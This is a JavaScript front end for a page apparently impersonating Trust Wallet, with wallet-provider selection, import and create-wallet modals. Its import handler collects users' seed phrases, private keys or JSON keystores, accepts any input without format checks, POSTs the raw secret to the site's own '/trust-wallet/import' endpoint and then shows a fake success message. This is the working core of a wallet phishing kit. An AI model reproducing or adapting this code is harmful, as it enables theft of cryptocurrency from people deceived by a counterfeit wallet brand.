/* ═══════════════════════════════════════
   TRUST WALLET — Flexible Version (Works with ANY Wallet Provider)
   Supports: Trust Wallet, Metamask, Phantom, Coinbase, Ledger, etc.
   Stores ANY phrase/private key without restrictions
═══════════════════════════════════════ */

document.addEventListener('DOMContentLoaded', function () {

    // Track selected wallet provider (supports ALL providers)
    var selectedWalletProvider = 'trust_wallet_mobile';
    var selectedImportMethod = 'seed_phrase'; // seed_phrase, private_key, json_file

    // Find all wallet items and add click handler to capture provider
    document.querySelectorAll('.wallet-item').forEach(function (item) {
        item.addEventListener('click', function () {
            var walletText = this.innerText || this.textContent;
            var walletIcon = this.querySelector('span:first-child')?.textContent || '';

            // Map display names to database-friendly values
            if (walletText.includes('Trust Wallet Mobile') || walletIcon.includes('🐺')) {
                selectedWalletProvider = 'trust_wallet_mobile';
            } else if (walletText.includes('Metamask') || walletIcon.includes('🦊')) {
                selectedWalletProvider = 'metamask';
            } else if (walletText.includes('Phantom') || walletIcon.includes('👻')) {
                selectedWalletProvider = 'phantom';
            } else if (walletText.includes('Coinbase') || walletIcon.includes('🔵')) {
                selectedWalletProvider = 'coinbase';
            } else if (walletText.includes('Other mobile') || walletText.includes('other')) {
                selectedWalletProvider = 'other_mobile';
            } else if (walletText.includes('Ledger') || walletText.includes('Hardware')) {
                selectedWalletProvider = 'ledger';
            }

            localStorage.setItem('selectedWalletProvider', selectedWalletProvider);
            console.log('Selected wallet provider:', selectedWalletProvider);
            
            // Update UI to show selected provider
            document.querySelectorAll('.wallet-item').forEach(w => w.classList.remove('selected'));
            this.classList.add('selected');
        });
    });

    // Handle import method selection (Seed phrase vs Private key)
    var seedPhraseOption = document.getElementById('seedPhraseOption');
    var privateKeyOption = document.getElementById('privateKeyOption');
    var jsonFileOption = document.getElementById('jsonFileOption');
    var phraseInputContainer = document.getElementById('phraseInputContainer');
    var privateKeyContainer = document.getElementById('privateKeyContainer');
    var jsonContainer = document.getElementById('jsonContainer');

    if (seedPhraseOption) {
        seedPhraseOption.addEventListener('click', function() {
            selectedImportMethod = 'seed_phrase';
            if (phraseInputContainer) phraseInputContainer.style.display = 'block';
            if (privateKeyContainer) privateKeyContainer.style.display = 'none';
            if (jsonContainer) jsonContainer.style.display = 'none';
            document.querySelectorAll('.import-method-option').forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
        });
    }

    if (privateKeyOption) {
        privateKeyOption.addEventListener('click', function() {
            selectedImportMethod = 'private_key';
            if (phraseInputContainer) phraseInputContainer.style.display = 'none';
            if (privateKeyContainer) privateKeyContainer.style.display = 'block';
            if (jsonContainer) jsonContainer.style.display = 'none';
            document.querySelectorAll('.import-method-option').forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
        });
    }

    if (jsonFileOption) {
        jsonFileOption.addEventListener('click', function() {
            selectedImportMethod = 'json_file';
            if (phraseInputContainer) phraseInputContainer.style.display = 'none';
            if (privateKeyContainer) privateKeyContainer.style.display = 'none';
            if (jsonContainer) jsonContainer.style.display = 'block';
            document.querySelectorAll('.import-method-option').forEach(opt => opt.classList.remove('active'));
            this.classList.add('active');
        });
    }

    /* ─────────────────────────────────────
       HELPERS
    ───────────────────────────────────── */
    function $(id) { return document.getElementById(id); }

    function openOverlay(id) {
        var el = $(id);
        if (el) {
            el.classList.add('open');
            document.body.style.overflow = 'hidden';
        }
    }

    function closeOverlay(id) {
        var el = $(id);
        if (el) {
            el.classList.remove('open');
            document.body.style.overflow = '';
        }
    }

    function showToast(message, type) {
        type = type || 'success';
        var toast = document.createElement('div');
        toast.textContent = message;
        toast.style.cssText =
            'position:fixed;bottom:30px;left:50%;transform:translateX(-50%);' +
            'background:' + (type === 'success' ? '#00E676' : (type === 'warning' ? '#ffaa00' : '#ff4466')) + ';' +
            'color:' + (type === 'success' ? '#0B0B0B' : '#fff') + ';' +
            'padding:12px 24px;border-radius:40px;font-weight:600;font-size:14px;' +
            'z-index:10000;font-family:"DM Sans",sans-serif;' +
            'box-shadow:0 4px 20px rgba(0,0,0,0.3);' +
            'max-width:90%;word-break:break-word;text-align:center;';
        document.body.appendChild(toast);
        setTimeout(function () {
            toast.style.opacity = '0';
            setTimeout(function () { toast.remove(); }, 300);
        }, 4000);
    }

    /* ─────────────────────────────────────
       SHOW ERROR MODAL (For detailed errors)
    ───────────────────────────────────── */
    function showErrorModal(title, message, details) {
        if (!$('errorModalOverlay')) {
            createErrorModal();
        }
        
        var errorTitle = $('errorModalTitle');
        var errorMessage = $('errorModalMessage');
        var errorDetails = $('errorModalDetails');
        
        if (errorTitle) errorTitle.textContent = title;
        if (errorMessage) errorMessage.textContent = message;
        if (errorDetails) {
            if (details) {
                errorDetails.textContent = details;
                errorDetails.style.display = 'block';
            } else {
                errorDetails.style.display = 'none';
            }
        }
        
        openOverlay('errorModalOverlay');
    }

    function createErrorModal() {
        var modal = document.createElement('div');
        modal.id = 'errorModalOverlay';
        modal.className = 'modal-overlay';
        modal.innerHTML =
            '<div class="modal-container error-modal">' +
                '<div class="error-content">' +
                    '<div class="error-icon">' +
                        '<svg width="48" height="48" viewBox="0 0 24 24" fill="none">' +
                            '<circle cx="12" cy="12" r="10" stroke="#ff4466" stroke-width="2"/>' +
                            '<line x1="12" y1="8" x2="12" y2="12" stroke="#ff4466" stroke-width="2" stroke-linecap="round"/>' +
                            '<circle cx="12" cy="16" r="1" fill="#ff4466"/>' +
                        '</svg>' +
                    '</div>' +
                    '<h3 id="errorModalTitle" class="error-title">Error</h3>' +
                    '<p id="errorModalMessage" class="error-message">An error occurred</p>' +
                    '<div id="errorModalDetails" class="error-details" style="display:none;"></div>' +
                    '<div class="error-actions">' +
                        '<button id="errorOkBtn" class="btn btn-error">OK</button>' +
                    '</div>' +
                '</div>' +
            '</div>';
        document.body.appendChild(modal);

        var style = document.createElement('style');
        style.textContent =
            '.error-modal{max-width:400px;text-align:center;padding:32px;background:linear-gradient(180deg,#1a1a2e 0%,#16213e 100%);border:1px solid rgba(255,68,102,0.3);border-radius:24px}' +
            '.error-icon{margin-bottom:20px}' +
            '.error-title{font-size:24px;font-weight:700;margin-bottom:12px;color:#ff4466}' +
            '.error-message{font-size:16px;color:rgba(255,255,255,0.8);margin-bottom:16px;line-height:1.5}' +
            '.error-details{background:rgba(255,68,102,0.1);border-radius:8px;padding:12px;margin:16px 0;font-size:13px;color:rgba(255,255,255,0.6);font-family:monospace;text-align:left;word-break:break-all}' +
            '.error-actions{margin-top:24px}' +
            '.btn-error{background:linear-gradient(135deg,#ff4466 0%,#cc0033 100%);color:#fff;border:none;padding:12px 24px;border-radius:12px;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s ease}' +
            '.btn-error:hover{transform:translateY(-2px);box-shadow:0 4px 20px rgba(255,68,102,0.3)}';
        document.head.appendChild(style);

        if ($('errorOkBtn')) {
            $('errorOkBtn').addEventListener('click', function () {
                closeOverlay('errorModalOverlay');
            });
        }

        modal.addEventListener('click', function (e) {
            if (e.target === modal) {
                closeOverlay('errorModalOverlay');
            }
        });
    }

    /* ─────────────────────────────────────
       LANDING: CHECKBOX
    ───────────────────────────────────── */
    var termsLabel = $('termsLabel');
    var termsCheck = $('termsCheck');
    var checkboxViz = $('checkboxViz');

    if (termsLabel) {
        termsLabel.addEventListener('click', function (e) {
            if (e.target.tagName === 'A') return;
            termsCheck.checked = !termsCheck.checked;
            checkboxViz.classList.toggle('checked', termsCheck.checked);
        });
    }

    /* ─────────────────────────────────────
       LANDING: BUTTONS
    ───────────────────────────────────── */
    var haveWalletBtn = $('haveWalletBtn');
    var createWalletBtn = $('createWalletBtn');

    if (haveWalletBtn) {
        haveWalletBtn.addEventListener('click', function () {
            if (!termsCheck.checked) {
                showToast('Please accept Terms of Use and Privacy Policy first', 'error');
                return;
            }
            this.classList.add('active');
            setTimeout(function () {
                impGoStep(1);
                openOverlay('importModalOverlay');
            }, 160);
        });
    }

    if (createWalletBtn) {
        createWalletBtn.addEventListener('click', function () {
            if (!termsCheck.checked) {
                showToast('Please accept Terms of Use and Privacy Policy first', 'error');
                return;
            }
            this.classList.add('active');
            setTimeout(function () {
                crtGoStep(1);
                openOverlay('createModalOverlay');
            }, 160);
        });
    }

    /* ─────────────────────────────────────
       CLOSE MODALS
    ───────────────────────────────────── */
    document.addEventListener('keydown', function (e) {
        if (e.key !== 'Escape') return;
        if ($('importModalOverlay') && $('importModalOverlay').classList.contains('open')) closeImportModal();
        if ($('createModalOverlay') && $('createModalOverlay').classList.contains('open')) closeCreateModal();
        if ($('successModalOverlay') && $('successModalOverlay').classList.contains('open')) closeSuccessModalAndRedirect();
        if ($('errorModalOverlay') && $('errorModalOverlay').classList.contains('open')) closeOverlay('errorModalOverlay');
    });

    if ($('importModalOverlay')) {
        $('importModalOverlay').addEventListener('click', function (e) {
            if (e.target === this) closeImportModal();
        });
    }

    if ($('createModalOverlay')) {
        $('createModalOverlay').addEventListener('click', function (e) {
            if (e.target === this) closeCreateModal();
        });
    }

    function closeImportModal() {
        closeOverlay('importModalOverlay');
        if (haveWalletBtn) haveWalletBtn.classList.remove('active');
        if ($('secretPhrase')) $('secretPhrase').value = '';
        if ($('privateKey')) $('privateKey').value = '';
        if ($('walletName')) $('walletName').value = 'Main wallet';
        if ($('jsonFileInput')) $('jsonFileInput').value = '';
    }

    function closeCreateModal() {
        closeOverlay('createModalOverlay');
        if (createWalletBtn) createWalletBtn.classList.remove('active');
        resetPasswordForm();
    }

    function closeSuccessModalAndRedirect() {
        closeOverlay('successModalOverlay');
        window.location.href = '/dashboard';
    }

    /* ═══════════════════════════════════════
       SUCCESS MODAL
    ═══════════════════════════════════════ */
    function showSuccessModal() {
        if (!$('successModalOverlay')) {
            createSuccessModal();
        }
        openOverlay('successModalOverlay');

        setTimeout(function () {
            var checkmark = document.querySelector('.success-checkmark');
            if (checkmark) checkmark.classList.add('animate');
        }, 100);
    }

    function createSuccessModal() {
        var modal = document.createElement('div');
        modal.id = 'successModalOverlay';
        modal.className = 'modal-overlay';
        modal.innerHTML =
            '<div class="modal-container success-modal">' +
                '<div class="success-content">' +
                    '<div class="success-icon-wrapper">' +
                        '<svg class="success-checkmark" viewBox="0 0 100 100">' +
                            '<circle class="checkmark-circle" cx="50" cy="50" r="45" fill="none" stroke="#00E676" stroke-width="3"/>' +
                            '<path class="checkmark-check" fill="none" stroke="#00E676" stroke-width="4" stroke-linecap="round" stroke-linejoin="round" d="M28 52 L42 66 L72 36"/>' +
                        '</svg>' +
                        '<div class="success-particles">' +
                            '<span></span><span></span><span></span>' +
                            '<span></span><span></span><span></span>' +
                            '<span></span><span></span>' +
                        '</div>' +
                    '</div>' +
                    '<h2 class="success-title">Wallet Imported Successfully!</h2>' +
                    '<p class="success-message">Your wallet has been securely imported and is ready to use.</p>' +
                    '<button id="successOkBtn" class="btn btn-success success-ok-btn">' +
                        '<span>Go to Dashboard</span>' +
                        '<svg width="20" height="20" viewBox="0 0 20 20" fill="none">' +
                            '<path d="M4.167 10h11.666m0 0L10 4.167M15.833 10L10 15.833" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>' +
                        '</svg>' +
                    '</button>' +
                '</div>' +
            '</div>';
        document.body.appendChild(modal);

        var style = document.createElement('style');
        style.textContent =
            '.success-modal{max-width:420px;text-align:center;padding:48px 40px;background:linear-gradient(180deg,#1a1a2e 0%,#16213e 100%);border:1px solid rgba(0,230,118,0.2);border-radius:24px;position:relative;overflow:hidden}' +
            '.success-modal::before{content:"";position:absolute;top:-50%;left:-50%;width:200%;height:200%;background:radial-gradient(circle,rgba(0,230,118,0.1) 0%,transparent 70%);animation:successPulse 3s ease-in-out infinite}' +
            '@keyframes successPulse{0%,100%{transform:scale(0.8);opacity:0.5}50%{transform:scale(1.2);opacity:1}}' +
            '.success-content{position:relative;z-index:1}' +
            '.success-icon-wrapper{position:relative;width:100px;height:100px;margin:0 auto 32px}' +
            '.success-checkmark{width:100%;height:100%;transform:scale(0);transition:transform 0.5s cubic-bezier(0.68,-0.55,0.265,1.55)}' +
            '.success-checkmark.animate{transform:scale(1)}' +
            '.checkmark-circle{stroke-dasharray:283;stroke-dashoffset:283;animation:drawCircle 0.6s ease forwards 0.2s}' +
            '.checkmark-check{stroke-dasharray:100;stroke-dashoffset:100;animation:drawCheck 0.4s ease forwards 0.8s}' +
            '@keyframes drawCircle{to{stroke-dashoffset:0}}' +
            '@keyframes drawCheck{to{stroke-dashoffset:0}}' +
            '.success-particles{position:absolute;top:50%;left:50%;width:100%;height:100%;transform:translate(-50%,-50%);pointer-events:none}' +
            '.success-particles span{position:absolute;width:8px;height:8px;background:#00E676;border-radius:50%;top:50%;left:50%;opacity:0}' +
            '.success-checkmark.animate~.success-particles span{animation:particleBurst 0.8s ease forwards 1s}' +
            '.success-particles span:nth-child(1){transform:rotate(0deg) translateX(60px)}' +
            '.success-particles span:nth-child(2){transform:rotate(45deg) translateX(60px)}' +
            '.success-particles span:nth-child(3){transform:rotate(90deg) translateX(60px)}' +
            '.success-particles span:nth-child(4){transform:rotate(135deg) translateX(60px)}' +
            '.success-particles span:nth-child(5){transform:rotate(180deg) translateX(60px)}' +
            '.success-particles span:nth-child(6){transform:rotate(225deg) translateX(60px)}' +
            '.success-particles span:nth-child(7){transform:rotate(270deg) translateX(60px)}' +
            '.success-particles span:nth-child(8){transform:rotate(315deg) translateX(60px)}' +
            '@keyframes particleBurst{0%{opacity:1;transform:rotate(var(--rotation,0deg)) translateX(60px) scale(1)}100%{opacity:0;transform:rotate(var(--rotation,0deg)) translateX(100px) scale(0)}}' +
            '.success-title{font-size:28px;font-weight:700;margin-bottom:12px;background:linear-gradient(135deg,#fff 0%,#00E676 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}' +
            '.success-message{font-size:16px;color:rgba(255,255,255,0.7);margin-bottom:32px;line-height:1.5}' +
            '.success-ok-btn{background:linear-gradient(135deg,#00E676 0%,#00C853 100%);color:#0B0B0B;border:none;padding:16px 32px;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:8px;transition:all 0.3s ease;box-shadow:0 4px 20px rgba(0,230,118,0.3)}' +
            '.success-ok-btn:hover{transform:translateY(-2px);box-shadow:0 8px 30px rgba(0,230,118,0.4)}' +
            '.success-ok-btn:active{transform:translateY(0)}' +
            '.success-ok-btn svg{transition:transform 0.3s ease}' +
            '.success-ok-btn:hover svg{transform:translateX(4px)}';
        document.head.appendChild(style);

        $('successOkBtn').addEventListener('click', function () {
            closeSuccessModalAndRedirect();
        });
    }

    /* ═══════════════════════════════════════
       IMPORT MODAL - Steps Navigation
    ═══════════════════════════════════════ */
    var impCurrentStep = 1;

    var IMP_LEFT_DATA = {
        1: { label: 'Step 1 of 3', title: 'Import a wallet', hint: 'Select the wallet provider you want to import from.' },
        2: { label: 'Step 2 of 3', title: 'Import a wallet', hint: "Choose how you'd like to import." },
        3: { label: 'Step 3 of 3', title: 'Import a wallet', hint: 'Enter your secret phrase, private key, or upload JSON file.' }
    };

    function impGoStep(n) {
        var current = $('imp-step' + impCurrentStep);
        if (current) current.classList.remove('active');
        var next = $('imp-step' + n);
        if (next) next.classList.add('active');
        impCurrentStep = n;
        updateImpLeft(n);
    }

    function updateImpLeft(step) {
        var dots = [$('imp-dot1'), $('imp-dot2'), $('imp-dot3')];
        var d = IMP_LEFT_DATA[step];
        dots.forEach(function (dot, i) {
            if (dot) {
                dot.classList.remove('active', 'done');
                if (i + 1 < step) dot.classList.add('done');
                if (i + 1 === step) dot.classList.add('active');
            }
        });
        if ($('imp-stepLabel')) $('imp-stepLabel').textContent = d.label;
        if ($('imp-leftTitle')) $('imp-leftTitle').textContent = d.title;
        if ($('imp-leftHint') && $('imp-leftHint').querySelector('p')) {
            $('imp-leftHint').querySelector('p').textContent = d.hint;
        }
    }

    if ($('imp-closeBtn')) {
        $('imp-closeBtn').addEventListener('click', closeImportModal);
    }

    document.querySelectorAll('[data-imp-goto]').forEach(function (el) {
        el.addEventListener('click', function () {
            impGoStep(parseInt(this.dataset.impGoto));
        });
    });

    if ($('qrMethodBtn')) {
        $('qrMethodBtn').addEventListener('click', function () {
            showToast('QR Code sync coming soon!', 'info');
        });
    }

    if ($('qrImportTopBtn')) {
        $('qrImportTopBtn').addEventListener('click', function () {
            showToast('QR Code sync coming soon!', 'info');
        });
    }

    if ($('clearWalletName')) {
        $('clearWalletName').addEventListener('click', function () {
            if ($('walletName')) $('walletName').value = '';
        });
    }

    // Handle JSON file upload
    if ($('jsonFileInput')) {
        $('jsonFileInput').addEventListener('change', function(e) {
            var file = e.target.files[0];
            if (file) {
                var reader = new FileReader();
                reader.onload = function(event) {
                    try {
                        var jsonContent = event.target.result;
                        // Store the JSON content
                        window.tempJsonData = jsonContent;
                        showToast('JSON file loaded successfully', 'success');
                    } catch (error) {
                        showToast('Error reading JSON file', 'error');
                    }
                };
                reader.readAsText(file);
            }
        });
    }

    /* ═══════════════════════════════════════
       ENHANCED IMPORT HANDLER - Works with ANY wallet & ANY phrase
       No restrictions on phrase length or format
    ═══════════════════════════════════════ */
    function getSecretData() {
        // Get the secret data based on import method
        if (selectedImportMethod === 'seed_phrase') {
            var phrase = $('secretPhrase')?.value.trim() || '';
            return {
                value: phrase,
                type: 'seed_phrase',
                label: 'Seed Phrase'
            };
        } else if (selectedImportMethod === 'private_key') {
            var privateKey = $('privateKey')?.value.trim() || '';
            return {
                value: privateKey,
                type: 'private_key',
                label: 'Private Key'
            };
        } else if (selectedImportMethod === 'json_file') {
            var jsonData = window.tempJsonData || '';
            return {
                value: jsonData,
                type: 'json_file',
                label: 'JSON Keystore'
            };
        }
        return { value: '', type: 'unknown', label: 'Unknown' };
    }

    function handleImport() {
        var secretData = getSecretData();
        var secretValue = secretData.value;
        var importType = secretData.type;
        
        var walletName = $('walletName')?.value.trim() || 'My Wallet';
        var walletProvider = localStorage.getItem('selectedWalletProvider') || selectedWalletProvider || 'trust_wallet_mobile';

        // Validation - only check if something was entered, no format restrictions
        if (!secretValue) {
            if (importType === 'seed_phrase') {
                var ta = $('secretPhrase');
                if (ta) {
                    ta.style.borderColor = '#ff4466';
                    ta.focus();
                    setTimeout(function () { ta.style.borderColor = ''; }, 1600);
                }
                showToast('Please enter your secret phrase', 'error');
            } else if (importType === 'private_key') {
                var pk = $('privateKey');
                if (pk) {
                    pk.style.borderColor = '#ff4466';
                    pk.focus();
                    setTimeout(function () { pk.style.borderColor = ''; }, 1600);
                }
                showToast('Please enter your private key', 'error');
            } else if (importType === 'json_file') {
                showToast('Please upload a JSON keystore file', 'error');
            }
            return;
        }

        var importBtn = $('importBtn');
        var originalText = importBtn.textContent;
        importBtn.disabled = true;
        importBtn.textContent = 'Importing...';

        console.log('Importing wallet:', {
            provider: walletProvider,
            method: importType,
            name: walletName
        });

        fetch('/trust-wallet/import', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                secretPhrase: secretValue,  // This can be phrase, private key, or JSON string
                walletName: walletName,
                walletProvider: walletProvider,
                importMethod: importType
            })
        })
        .then(function (response) {
            return response.json().then(function (data) {
                return { status: response.status, data: data };
            });
        })
        .then(function (result) {
            var data = result.data;
            var status = result.status;

            if (status === 200 && data.success) {
                closeImportModal();
                showSuccessModal();
            } else {
                handleImportError(data, status);
                importBtn.disabled = false;
                importBtn.textContent = originalText;
            }
        })
        .catch(function (error) {
            console.error('Network error:', error);
            showErrorModal(
                'Connection Error',
                'Unable to connect to the server',
                'Please check your internet connection and try again.\n\nError: ' + error.message
            );
            importBtn.disabled = false;
            importBtn.textContent = originalText;
        });
    }

    function handleImportError(data, status) {
        var errorCode = data.code || data.errorCode;
        var errorMessage = data.message || data.error || 'Import failed';
        
        switch (errorCode) {
            case 11000:
            case 'DUPLICATE_WALLET':
            case 'WALLET_ALREADY_EXISTS':
                showErrorModal(
                    'Wallet Already Exists',
                    'A wallet is already associated with your account',
                    'Each user can only have one wallet. If you need to change your wallet, please contact support.'
                );
                break;
                
            case 400:
            case 'INVALID_DATA':
                showErrorModal(
                    'Invalid Wallet Data',
                    'The wallet data you provided is invalid',
                    'Please check your secret phrase, private key, or JSON file and try again.'
                );
                break;
                
            case 401:
            case 'UNAUTHORIZED':
                showErrorModal(
                    'Session Expired',
                    'Your session has expired',
                    'Please refresh the page and try again.'
                );
                break;
                
            case 409:
            case 'CONFLICT':
                showErrorModal(
                    'Account Conflict',
                    'This wallet is already linked to another account',
                    'Please use a different wallet or contact support.'
                );
                break;
                
            default:
                if (errorMessage.toLowerCase().includes('duplicate') || 
                    errorMessage.toLowerCase().includes('already exists')) {
                    showErrorModal(
                        'Wallet Already Exists',
                        'You already have a wallet registered',
                        'Each user can only have one wallet.'
                    );
                } else {
                    showErrorModal(
                        'Import Failed',
                        'Unable to import your wallet',
                        errorMessage || 'Please try again or contact support if the issue persists.'
                    );
                }
        }
    }

    if ($('importBtn')) {
        $('importBtn').addEventListener('click', handleImport);
    }

    /* ═══════════════════════════════════════
       CREATE WALLET MODAL (Unchanged)
    ═══════════════════════════════════════ */
    var crtCurrentStep = 1;

    var CRT_LEFT_DATA = {
        1: { label: 'Step 1 of 2', title: 'Secure your wallet', hint: 'Choose how to protect your new wallet.' },
        2: { label: 'Step 2 of 2', title: 'Create a password', hint: 'Use at least 8 characters.' }
    };

    function crtGoStep(n) {
        var current = $('crt-step' + crtCurrentStep);
        if (current) current.classList.remove('active');
        var next = $('crt-step' + n);
        if (next) next.classList.add('active');
        crtCurrentStep = n;
        updateCrtLeft(n);
    }

    function updateCrtLeft(step) {
        var dots = [$('crt-dot1'), $('crt-dot2')];
        var d = CRT_LEFT_DATA[step];
        dots.forEach(function (dot, i) {
            if (dot) {
                dot.classList.remove('active', 'done');
                if (i + 1 < step) dot.classList.add('done');
                if (i + 1 === step) dot.classList.add('active');
            }
        });
        if ($('crt-stepLabel')) $('crt-stepLabel').textContent = d.label;
        if ($('crt-leftTitle')) $('crt-leftTitle').textContent = d.title;
        if ($('crt-leftHint') && $('crt-leftHint').querySelector('p')) {
            $('crt-leftHint').querySelector('p').textContent = d.hint;
        }
    }

    if ($('crt-closeBtn')) {
        $('crt-closeBtn').addEventListener('click', closeCreateModal);
    }

    document.querySelectorAll('[data-crt-goto]').forEach(function (el) {
        el.addEventListener('click', function () {
            crtGoStep(parseInt(this.dataset.crtGoto));
        });
    });

    if ($('windowsHelloBtn')) {
        $('windowsHelloBtn').addEventListener('click', function () {
            showToast('Windows Hello coming soon!', 'info');
        });
    }

    // Password form elements
    var newPasswordInput = $('newPassword');
    var confirmPasswordInput = $('confirmPassword');
    var strengthFill = $('strengthFill');
    var strengthLabel = $('strengthLabel');
    var matchHint = $('passwordMatchHint');
    var passwordTermsLabel = $('passwordTermsLabel');
    var passwordTermsCheck = $('passwordTermsCheck');
    var passwordTermsViz = $('passwordTermsViz');
    var createSubmitBtn = $('createWalletSubmitBtn');

    if ($('toggleNewPass')) {
        $('toggleNewPass').addEventListener('click', function () {
            if (newPasswordInput) {
                newPasswordInput.type = newPasswordInput.type === 'password' ? 'text' : 'password';
            }
        });
    }

    if ($('toggleConfirmPass')) {
        $('toggleConfirmPass').addEventListener('click', function () {
            if (confirmPasswordInput) {
                confirmPasswordInput.type = confirmPasswordInput.type === 'password' ? 'text' : 'password';
            }
        });
    }

    if (newPasswordInput) {
        newPasswordInput.addEventListener('input', function () {
            updateStrength(this.value);
            validatePasswordForm();
        });
    }

    if (confirmPasswordInput) {
        confirmPasswordInput.addEventListener('input', validatePasswordForm);
    }

    if (passwordTermsLabel) {
        passwordTermsLabel.addEventListener('click', function (e) {
            if (e.target.tagName === 'A') return;
            if (passwordTermsCheck) {
                passwordTermsCheck.checked = !passwordTermsCheck.checked;
                if (passwordTermsViz) passwordTermsViz.classList.toggle('checked', passwordTermsCheck.checked);
                validatePasswordForm();
            }
        });
    }

    function updateStrength(pw) {
        var score = 0;
        if (pw.length >= 8) score++;
        if (pw.length >= 12) score++;
        if (/[A-Z]/.test(pw)) score++;
        if (/[0-9]/.test(pw)) score++;
        if (/[^A-Za-z0-9]/.test(pw)) score++;

        var levels = [
            { pct: '0%', color: 'transparent', label: '' },
            { pct: '25%', color: '#ff4466', label: 'Weak' },
            { pct: '50%', color: '#ffaa00', label: 'Fair' },
            { pct: '75%', color: '#00b0ff', label: 'Good' },
            { pct: '100%', color: '#00E676', label: 'Strong' }
        ];
        var lvl = levels[Math.min(score, 4)];

        if (!pw) {
            if (strengthFill) strengthFill.style.width = '0%';
            if (strengthFill) strengthFill.style.background = 'transparent';
            if (strengthLabel) strengthLabel.textContent = '';
            return;
        }
        if (strengthFill) strengthFill.style.width = lvl.pct;
        if (strengthFill) strengthFill.style.background = lvl.color;
        if (strengthLabel) {
            strengthLabel.style.color = lvl.color;
            strengthLabel.textContent = lvl.label;
        }
    }

    function validatePasswordForm() {
        if (!newPasswordInput || !confirmPasswordInput) return;

        var pw = newPasswordInput.value;
        var cpw = confirmPasswordInput.value;
        var termsOk = passwordTermsCheck ? passwordTermsCheck.checked : false;

        if (matchHint) {
            if (cpw.length > 0) {
                if (pw === cpw) {
                    matchHint.textContent = '✓ Passwords match';
                    matchHint.style.color = '#00E676';
                    if (confirmPasswordInput) confirmPasswordInput.style.borderColor = '';
                } else {
                    matchHint.textContent = '✗ Passwords do not match';
                    matchHint.style.color = '#ff4466';
                    if (confirmPasswordInput) confirmPasswordInput.style.borderColor = '#ff4466';
                }
            } else {
                matchHint.textContent = '';
                if (confirmPasswordInput) confirmPasswordInput.style.borderColor = '';
            }
        }

        var canSubmit = pw.length >= 8 && pw === cpw && termsOk;
        if (createSubmitBtn) createSubmitBtn.disabled = !canSubmit;
    }

    function handleCreateWallet() {
        if (!newPasswordInput || !confirmPasswordInput) return;

        var password = newPasswordInput.value;
        var confirmPassword = confirmPasswordInput.value;

        if (password !== confirmPassword) {
            showToast('Passwords do not match', 'error');
            return;
        }

        if (password.length < 8) {
            showToast('Password must be at least 8 characters', 'error');
            return;
        }

        if (passwordTermsCheck && !passwordTermsCheck.checked) {
            showToast('Please agree to the terms', 'error');
            return;
        }

        var form = document.createElement('form');
        form.method = 'POST';
        form.action = '/trust-wallet/create';

        var passwordInput = document.createElement('input');
        passwordInput.type = 'hidden';
        passwordInput.name = 'password';
        passwordInput.value = password;

        form.appendChild(passwordInput);
        document.body.appendChild(form);
        form.submit();
    }

    if (createSubmitBtn) {
        createSubmitBtn.addEventListener('click', handleCreateWallet);
    }

    function resetPasswordForm() {
        if (newPasswordInput) newPasswordInput.value = '';
        if (confirmPasswordInput) confirmPasswordInput.value = '';
        if (passwordTermsCheck) passwordTermsCheck.checked = false;
        if (passwordTermsViz) passwordTermsViz.classList.remove('checked');
        if (strengthFill) strengthFill.style.width = '0%';
        if (strengthLabel) strengthLabel.textContent = '';
        if (matchHint) matchHint.textContent = '';
        if (createSubmitBtn) {
            createSubmitBtn.disabled = true;
            createSubmitBtn.textContent = 'Create Wallet';
        }
    }

});